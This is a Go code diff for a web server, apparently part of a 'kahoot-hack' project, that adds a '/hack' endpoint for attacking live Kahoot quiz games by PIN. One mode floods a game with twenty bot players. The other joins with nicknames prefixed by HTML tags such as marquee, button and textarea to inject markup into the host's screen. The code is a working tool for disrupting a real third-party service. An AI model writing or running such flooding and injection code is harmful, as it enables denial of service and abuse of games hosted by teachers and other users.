@@ -11,7 +11,7 @@ import (
 	"github.com/unixpickle/kahoot-hack/kahoot"
 )
 
-var floodSemaphore = make(chan struct{}, 10)
+var usageSemaphore = make(chan struct{}, 10)
 
 func main() {
 	if len(os.Args) != 2 {
@@ -24,12 +24,11 @@ func main() {
 		os.Exit(1)
 	}
 
+	http.HandleFunc("/hack", handleHack)
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		path := strings.Replace(r.URL.Path, "/", "", -1)
 		if path == "" {
 			http.ServeFile(w, r, "assets/index.html")
-		} else if path == "flood" {
-			handleFlood(w, r)
 		} else {
 			http.ServeFile(w, r, "assets/"+path)
 		}
@@ -38,28 +37,62 @@ func main() {
 	http.ListenAndServe(":"+os.Args[1], nil)
 }
 
-func handleFlood(w http.ResponseWriter, r *http.Request) {
-	floodSemaphore <- struct{}{}
+func handleHack(w http.ResponseWriter, r *http.Request) {
+	usageSemaphore <- struct{}{}
 	defer func() {
-		<-floodSemaphore
+		<-usageSemaphore
 	}()
 
 	if r.ParseForm() != nil {
-		w.Write([]byte("<!doctype html><head></head><body>Invalid form</body><html>"))
+		http.ServeFile(w, r, "assets/invalid_form.html")
 		return
 	}
+
 	pin := strings.TrimSpace(r.PostFormValue("pin"))
 	nickname := r.PostFormValue("nickname")
-	log.Println("Flooding game", pin, "with nickname", nickname)
 	gamePin, _ := strconv.Atoi(pin)
+	hackType := r.PostFormValue("hack")
+
+	var res bool
+	if hackType == "Flood" {
+		res = floodHack(gamePin, nickname)
+	} else if hackType == "HTML Hack" {
+		res = htmlHack(gamePin, nickname)
+	} else {
+		http.ServeFile(w, r, "assets/invalid_form.html")
+		return
+	}
+
+	if res {
+		http.Redirect(w, r, "/", http.StatusTemporaryRedirect)
+	} else {
+		http.ServeFile(w, r, "assets/unknown_game.html")
+	}
+}
+
+func floodHack(gamePin int, nickname string) bool {
+	log.Println("Flood hack:", gamePin, "with nickname", nickname)
 	for i := 0; i < 20; i++ {
 		conn, err := kahoot.NewConn(gamePin)
 		if err != nil {
-			http.ServeFile(w, r, "assets/unknown_game.html")
-			return
+			return false
 		}
 		conn.Login(nickname + strconv.Itoa(i+1))
 		defer conn.Close()
 	}
-	http.Redirect(w, r, "/", http.StatusTemporaryRedirect)
+	return true
+}
+
+func htmlHack(gamePin int, nickname string) bool {
+	log.Println("HTML hack:", gamePin, "with nickname", nickname)
+	for _, prefix := range []string{"<h1>", "<u>", "<h2>", "<marquee>", "<button>",
+		"<input>", "<pre>", "<textarea>"} {
+		conn, err := kahoot.NewConn(gamePin)
+		if err != nil {
+			return false
+		}
+		defer conn.Close()
+		conn.Login(prefix + nickname)
+	}
+	return true
 }
